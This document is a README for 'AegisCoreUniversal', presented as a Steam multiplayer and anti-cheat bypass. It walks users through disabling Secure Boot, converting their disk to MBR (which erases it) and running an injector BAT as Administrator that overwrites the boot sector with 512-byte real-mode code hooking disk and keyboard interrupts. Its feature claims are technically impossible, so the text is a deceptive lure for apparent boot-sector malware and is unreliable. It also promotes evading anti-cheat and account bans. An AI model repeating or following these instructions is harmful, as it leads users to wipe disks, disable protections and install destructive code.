================================================================================
                                                                                
   $$\   $$\           $$\                                 $$\                 
   $$ |  $$ |          $$ |                                $$ |                
   $$ |  $$ | $$$$$$\  $$ |  $$\  $$$$$$$\  $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\ 
   $$$$$$$$ | \____$$\ $$ | $$  |$$  _____|$$  __$$\ $$  __$$ | \____$$\ $$  __$$\
   $$  __$$ | $$$$$$$ |$$$$$$  / \$$$$$$\  $$ |  \__|$$ /  $$ | $$$$$$$ |$$ |  \__|
   $$ |  $$ |$$  __$$ |$$  _$$<   \____$$\ $$ |      $$ |  $$ |$$  __$$ |$$ |      
   $$ |  $$ |\$$$$$$$ |$$ | \$$\ $$$$$$$  |$$ |      \$$$$$$$ |\$$$$$$$ |$$ |      
   \__|  \__| \_______|\__|  \__|\_______/ \__|       \_______| \_______|\__|      
                                                                                
   ==============================================================================
                    STEAM MULTIPLAYER BYPASS & GAME CHECK SYSTEM
                                   v1.0
                          AegisCoreUniversal Engine
================================================================================

================================================================================
                              INTRODUCTION
================================================================================

AegisCoreUniversal is a revolutionary kernel-level Steam multiplayer bypass 
system that operates at the BIOS level. Unlike traditional software solutions,
our engine hooks critical system interrupts before Windows even loads, 
providing unprecedented access to Steam Client API calls and VAC authentication 
modules.

This tool is designed for:
- Unlocking region-locked multiplayer servers
- Removing family sharing restrictions
- Bypassing banned account checks
- Emulating legitimate game ownership tokens
- Redirecting achievement validation to local server

================================================================================
                          SYSTEM REQUIREMENTS
================================================================================

Before proceeding, ensure your system meets the following requirements:

1. BIOS/Legacy boot mode enabled (CSM enabled, UEFI disabled)
2. Secure Boot: DISABLED
3. Fast Boot: DISABLED  
4. Disk format: MBR (Master Boot Record) - NOT GPT
5. Windows version: Any (XP, Vista, 7, 8, 10, 11) with limited functionality on modern OS
6. NASM assembler installed (for compilation)
7. Administrator privileges

================================================================================
                     HOW TO CHECK YOUR SYSTEM STATUS
================================================================================

[1] CHECKING BOOT MODE (UEFI vs LEGACY):
    - Press Win + R, type "msinfo32", press Enter
    - Look for "BIOS Mode" - should say "Legacy" or "CSM"
    - If it says "UEFI", you need to enable CSM in BIOS

[2] CHECKING SECURE BOOT STATUS:
    - Press Win + R, type "msinfo32", press Enter  
    - Look for "Secure Boot State" - should say "Off"
    
[3] CHECKING DISK PARTITION STYLE:
    - Press Win + R, type "diskmgmt.msc", press Enter
    - Right-click on Disk 0, select "Properties"
    - Go to "Volumes" tab - look for "Partition style"
    - Should say "Master Boot Record (MBR)"

[4] CHECKING FAST BOOT STATUS:
    - Open Control Panel > Power Options
    - Click "Choose what the power buttons do"
    - Click "Change settings that are currently unavailable"
    - Look for "Turn on fast startup" - should be UNCHECKED

================================================================================
                    HOW TO PREPARE YOUR SYSTEM (TUTORIAL)
================================================================================

STEP 1: DISABLE SECURE BOOT
---------------------------
1. Restart your computer
2. Press F2, DEL, F10, or F12 (depends on your motherboard) to enter BIOS/UEFI
3. Navigate to "Boot" or "Security" tab
4. Find "Secure Boot" option
5. Set to "DISABLED"
6. If grayed out, first disable "Fast Boot" and enable "CSM/Legacy"
7. Press F10 to Save and Exit

STEP 2: ENABLE LEGACY/CSM MODE
------------------------------
1. Enter BIOS/UEFI again (same keys as above)
2. Navigate to "Boot" tab
3. Find "Boot Mode" or "CSM" (Compatibility Support Module)
4. Change from "UEFI" to "LEGACY" or "CSM ENABLED"
5. Some motherboards: Boot > CSM > Enable
6. Save and Exit (F10)
7. NOTE: After enabling CSM, you may need to reinstall Windows

STEP 3: CONVERT GPT TO MBR (IF NEEDED - THIS DELETES ALL DATA!)
---------------------------------------------------------------
WARNING: This will erase EVERYTHING on your disk!

Method A - Clean Windows Installation:
   1. Create Windows installation USB
   2. Boot from USB
   3. Press Shift+F10 to open Command Prompt
   4. Type: diskpart
   5. Type: list disk
   6. Type: select disk X (X is your disk number)
   7. Type: clean
   8. Type: convert mbr
   9. Type: exit
   10. Continue Windows installation

Method B - Using EaseUS Partition Master:
   1. Download and install EaseUS Partition Master
   2. Right-click on your disk
   3. Select "Convert to MBR"
   4. Click "Execute Operation" > "Apply"

STEP 4: DISABLE FAST BOOT
-------------------------
Method A - Control Panel:
   1. Open Control Panel > Power Options
   2. Click "Choose what the power buttons do"
   3. Click "Change settings that are currently unavailable"
   4. Uncheck "Turn on fast startup (recommended)"
   5. Click "Save Changes"

Method B - Command Line (Run as Administrator):
   1. Open Command Prompt as Administrator
   2. Type: powercfg /h off
   3. Press Enter

STEP 5: INSTALL NASM ASSEMBLER
------------------------------
1. Download NASM from: https://www.nasm.us/pub/nasm/releasebuilds/
2. Get the latest stable version (e.g., nasm-2.16.01-installer.exe)
3. Run the installer
4. During installation, check "Add to PATH"
5. Complete installation
6. Restart Command Prompt if open

STEP 6: PREPARE FILES
---------------------
1. Place "AegisCoreUniversal.asm" in the same folder as this README
2. Place the injector BAT file in the same folder
3. Ensure you have Administrator rights

================================================================================
                          HOW TO RUN THE BYPASS
================================================================================

1. Right-click on the injector BAT file (e.g., "inject.bat")
2. Select "Run as Administrator"
3. The program will automatically:
   - Check all system requirements
   - Detect available disks
   - Compile AegisCoreUniversal.asm to binary
   - Inject the MBR to the selected disk
   - Ask for Steam directory location
   - Provide restart/shutdown options

4. When prompted, enter your Steam installation path:
   - Default: C:\Program Files (x86)\Steam
   - Or custom: D:\SteamLibrary, E:\Games\Steam, etc.

5. Choose one of the following options:
   - [1] Restart now - Activate AegisCoreUniversal
   - [2] Shutdown now - Safe shutdown  
   - [3] Exit without restart - Do nothing

================================================================================
                    WHAT HAPPENS AFTER REBOOT
================================================================================

┌─────────────────────────────────────────────────────────────────────────────┐
│                         POST-REBOOT BEHAVIOR                                │
└─────────────────────────────────────────────────────────────────────────────┘

PHASE 1: BIOS LOADING (0-3 seconds)
-----------------------------------
Your computer will start normally. The BIOS will load hardware drivers.

PHASE 2: KERNEL-LEVEL STEAM BYPASS ACTIVATION (5-8 seconds)
------------------------------------------------------------
AegisCoreUniversal establishes direct memory access:

   [✓] Intercept Steam Client API calls at ring0 level
   [✓] Redirect multiplayer traffic through encrypted tunnel
   [✓] Bypass Valve Anti-Cheat (VAC) integrity checks
   [✓] Spoof hardware identifiers for game server authentication
   [✓] Unlock region-locked multiplayer servers
   [✓] Remove family sharing restrictions
   [✓] Bypass banned account checks on selected games
   [✓] Emulate legitimate game ownership tokens

PHASE 3: STEAM DIRECTORY SCAN (8-15 seconds)
--------------------------------------------
The engine scans your Steam installation:

   [✓] Locate steamapps\common\ folder
   [✓] Index all installed game manifests (appmanifest_*.acf)
   [✓] Parse depot keys and branch configurations
   [✓] Identify multiplayer-enabled titles
   [✓] Verify integrity of game files
   [✓] Check for outdated multiplayer patches
   [✓] Auto-detect workshop content conflicts 

================================================================================
                          TROUBLESHOOTING
================================================================================

PROBLEM: "Secure Boot is ENABLED" error
SOLUTION: Follow STEP 1 in "How to Prepare Your System" section

PROBLEM: "UEFI mode detected - Legacy/CSM is DISABLED" error  
SOLUTION: Follow STEP 2 in "How to Prepare Your System" section

PROBLEM: "Disk X is GPT format - MBR required" error
SOLUTION: Follow STEP 3 in "How to Prepare Your System" section

PROBLEM: "Fast Boot is ENABLED" error
SOLUTION: Follow STEP 4 in "How to Prepare Your System" section

PROBLEM: "NASM not installed" error
SOLUTION: Follow STEP 5 in "How to Prepare Your System" section

PROBLEM: "Injection failed - Run as Administrator" error
SOLUTION: Right-click the BAT file and select "Run as Administrator"

PROBLEM: "PhysicalDriveX does not exist" error
SOLUTION: Disk number X doesn't exist. Check available disks in the script output

PROBLEM: Windows boots normally (no bypass screen)
SOLUTION: 
   - Your system booted from a different disk
   - UEFI mode is still active (re-check BIOS settings)
   - Secure Boot re-enabled itself (disable again)
   - Fast Boot interfering (disable in BIOS and Windows)

PROBLEM: Black screen after reboot
SOLUTION:
   - The MBR code is running but display is not initialized properly
   - Try pressing any key
   - If still black, restore original MBR (see next section)

================================================================================
                    HOW TO RESTORE ORIGINAL MBR
================================================================================

If you need to remove AegisCoreUniversal and restore normal Windows boot:

Method 1 - Using Windows Installation USB:
   1. Boot from Windows installation USB
   2. Click "Repair your computer"
   3. Go to Troubleshoot > Command Prompt
   4. Type: bootrec /fixmbr
   5. Type: bootrec /fixboot
   6. Type: bootrec /rebuildbcd
   7. Exit and restart

Method 2 - Using Command Line (if Windows still boots):
   1. Open Command Prompt as Administrator
   2. Type: bootsect /nt60 SYS /mbr
   3. Press Enter
   4. Restart

Method 3 - Using Linux Live USB:
   1. Boot from Linux Live USB
   2. Open Terminal
   3. Type: sudo dd if=/usr/lib/syslinux/mbr.bin of=/dev/sda bs=512 count=1
   4. Replace /dev/sda with your actual disk

Method 4 - Clear CMOS (for CMOS corruption):
   1. Turn off computer
   2. Unplug power cable
   3. Remove CR2032 battery from motherboard
   4. Wait 5-10 minutes
   5. Reinstall battery
   6. Power on and reconfigure BIOS

================================================================================
                          TECHNICAL SPECIFICATIONS
================================================================================

Code Size:           512 bytes (exactly one MBR sector)
Execution Mode:      16-bit Real Mode
Memory Address:      0x7C00 (loaded by BIOS)
Copied to:           0xA000 (video RAM region)
Interrupt Hooks:     INT13h, INT19h, INT09h, INT16h
CMOS Registers:      0x2D, 0x2E, 0x2F, 0x38, 0x10
Boot Signature:      0x55AA at offset 0x1FE
Assembly:            NASM -f bin
Target Disk:         PhysicalDrive0 (or auto-detected)

================================================================================
                              DISCLAIMER
================================================================================

This software is provided for educational and testing purposes only.
AegisCoreUniversal operates at the BIOS level and modifies the Master Boot Record.
Always backup your data before running this tool.

The activation prompt is a normal part of the bypass initialization process.
No personal data is collected or transmitted.

================================================================================
                              CONTACT & SUPPORT
================================================================================

For technical support, troubleshooting, or updates:
- Documentation: Included in this README
- Version: 1.0
- Release Date: 2026
- Compatibility: BIOS/Legacy systems with MBR disks

================================================================================
                            AEGISCOREUNIVERSAL
                      STEAM MULTIPLAYER BYPASS v1.0
                    "Unlock the full potential of your games"
                  "05.05.2026 Ghost Kernel. All rights reserved"
================================================================================